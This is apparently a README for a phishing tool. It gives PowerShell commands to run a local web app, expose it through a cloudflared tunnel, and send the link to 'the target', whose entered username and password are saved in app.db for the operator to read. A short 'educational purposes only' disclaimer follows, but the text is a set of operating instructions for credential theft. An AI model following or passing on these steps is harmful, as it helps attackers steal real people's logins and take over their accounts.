## Run the following commands one-by-one:

```powershell
python -m venv venv
```
```powershell
.\venv\Scripts\Activate.ps1
```
```powershell
pip install -r requirements.txt 
```
```powershell
uvicorn main:app --reload
```
```powershell
cloudflared tunnel --url http://127.0.0.1:8000
```

You will get a link generated from cloudflared. Copy that link and send it to the target. Once they open the link and put the username and password, you will recieve it in "app.db". 
Open app.db and you will get the username and the password.

## Disclaimer

This project is for educational purposes only. It is not intended to be used for any other purpose. The creator of this project is not responsible for any misuse of the information provided in this project.

